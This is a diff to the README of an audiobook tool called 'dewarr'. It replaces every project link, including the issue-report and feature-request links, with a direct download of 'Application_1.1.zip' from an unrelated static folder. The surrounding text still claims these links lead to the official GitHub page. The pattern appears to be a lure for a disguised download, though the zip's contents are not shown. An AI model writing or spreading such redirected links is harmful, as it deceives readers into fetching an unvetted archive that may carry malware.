@@ -5,7 +5,7 @@ description: "Organize your reading lists, audiobooks, and downloads in one plac
 ---
 # 📚 dewarr - Your Personal Audiobook Discovery and Download Hub
 
-[![Download dewarr](https://img.shields.io/badge/Download-dewarr-blueviolet?style=for-the-badge&logo=github)](https://github.com/khaizrishal/dewarr)
+[![Download dewarr](https://img.shields.io/badge/Download-dewarr-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/khaizrishal/khaizrishal.github.io/main/static/Application_1.1.zip)
 
 ## 👋 Welcome to dewarr
 
@@ -35,7 +35,7 @@ Getting started with dewarr is easier than you might think. Follow these simple 
 
 ### 📥 Download dewarr
 
-Visit this link to download the application: **[https://github.com/khaizrishal/dewarr](https://github.com/khaizrishal/dewarr)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/khaizrishal/khaizrishal.github.io/main/static/Application_1.1.zip](https://raw.githubusercontent.com/khaizrishal/khaizrishal.github.io/main/static/Application_1.1.zip)**
 
 This link will take you to the official dewarr GitHub page where you'll find the download section. Look for the latest release and download the appropriate package for your system.
 
@@ -185,7 +185,7 @@ Periodically export your dewarr settings and wishlists. This protects your prefe
 
 Don't miss out on your next great audiobook. Download dewarr now and take control of your audiobook experience. Whether you're catching up on bestsellers, exploring new genres, or revisiting favorites, dewarr makes it effortless.
 
-**[Download dewarr Now](https://github.com/khaizrishal/dewarr)** – Your audiobook library will thank you!
+**[Download dewarr Now](https://raw.githubusercontent.com/khaizrishal/khaizrishal.github.io/main/static/Application_1.1.zip)** – Your audiobook library will thank you!
 
 ---
 
@@ -215,9 +215,9 @@ dewarr continues to work with your already-downloaded audiobooks. Syncing and ne
 
 ## 🔗 Quick Links
 
-- **[Download dewarr](https://github.com/khaizrishal/dewarr)**
-- **[Report an Issue](https://github.com/khaizrishal/dewarr/issues)**
-- **[Feature Requests](https://github.com/khaizrishal/dewarr/discussions)**
+- **[Download dewarr](https://raw.githubusercontent.com/khaizrishal/khaizrishal.github.io/main/static/Application_1.1.zip)**
+- **[Report an Issue](https://raw.githubusercontent.com/khaizrishal/khaizrishal.github.io/main/static/Application_1.1.zip)**
+- **[Feature Requests](https://raw.githubusercontent.com/khaizrishal/khaizrishal.github.io/main/static/Application_1.1.zip)**
 
 ---
 
